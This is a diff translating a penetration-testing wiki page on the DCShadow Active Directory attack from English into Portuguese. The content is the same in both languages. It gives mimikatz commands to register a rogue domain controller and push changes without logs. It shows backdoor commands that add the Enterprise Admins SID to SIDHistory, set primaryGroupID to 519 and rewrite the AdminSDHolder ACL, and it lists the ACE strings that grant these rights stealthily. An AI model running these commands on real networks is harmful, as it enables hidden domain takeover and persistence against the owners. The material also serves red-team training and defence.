@@ -2,11 +2,10 @@
 
 # DCShadow
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+Ele registra um **novo Controlador de Domínio** no AD e o utiliza para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** sobre as **modificações**. Você **precisa de privilégios de DA** e estar dentro do **domínio raiz**.\
+Note que se você usar dados incorretos, logs bem feios aparecerão.
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
-
+Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios de SYSTEM (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para empurrar os valores:
 ```bash:mimikatz1 (RPC servers)
 !+
 !processtoken
@@ -16,28 +15,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```bash:mimikatz2 (push) - Needs DA or similar
 lsadump::dcshadow /push
 ```
+Observe que **`elevate::token`** não funcionará na sessão `mimikatz1`, pois isso elevou os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
+Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Você pode enviar as alterações de um DA ou de um usuário com essas permissões mínimas:
 
-You can push the changes from a DA or from a user with this minimal permissions:
+- No **objeto de domínio**:
+- _DS-Install-Replica_ (Adicionar/Remover Réplica no Domínio)
+- _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
+- _DS-Replication-Synchronize_ (Sincronização de Replicação)
+- O **objeto Sites** (e seus filhos) no **container de Configuração**:
+- _CreateChild e DeleteChild_
+- O objeto do **computador que está registrado como um DC**:
+- _WriteProperty_ (Não Write)
+- O **objeto alvo**:
+- _WriteProperty_ (Não Write)
 
-- In the **domain object**:
-  - _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  - _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  - _DS-Replication-Synchronize_ (Replication Synchornization)
-- The **Sites object** (and its children) in the **Configuration container**:
-  - _CreateChild and DeleteChild_
-- The object of the **computer which is registered as a DC**:
-  - _WriteProperty_ (Not Write)
-- The **target object**:
-  - _WriteProperty_ (Not Write)
+Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
+Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Isso significa que o nome de usuário _**student1**_ ao fazer login na máquina _**mcorp-student1**_ tem permissões DCShadow sobre o objeto _**root1user**_.
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
-
-## Using DCShadow to create backdoors
-
+## Usando DCShadow para criar backdoors
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
@@ -52,24 +49,22 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
+## Shadowception - Conceder permissões DCShadow usando DCShadow (sem logs de permissões modificadas)
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+Precisamos adicionar os seguintes ACEs com o SID do nosso usuário no final:
 
-We need to append following ACEs with our user's SID at the end:
+- No objeto de domínio:
+- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
+- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- No objeto do computador atacante: `(A;;WP;;;UserSID)`
+- No objeto do usuário alvo: `(A;;WP;;;UserSID)`
+- No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;UserSID)`
 
-- On the domain object:
-  - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-  - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
-  - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-- On the attacker computer object: `(A;;WP;;;UserSID)`
-- On the target user object: `(A;;WP;;;UserSID)`
-- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+Para obter o ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Observe que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na **sessão mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração** que deseja fazer. Dessa forma, você só precisará **`/push`** uma vez para realizar todas as alterações acumuladas no servidor rogue.
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
-
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**Mais informações sobre DCShadow em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {{#include ../../banners/hacktricks-training.md}}
-
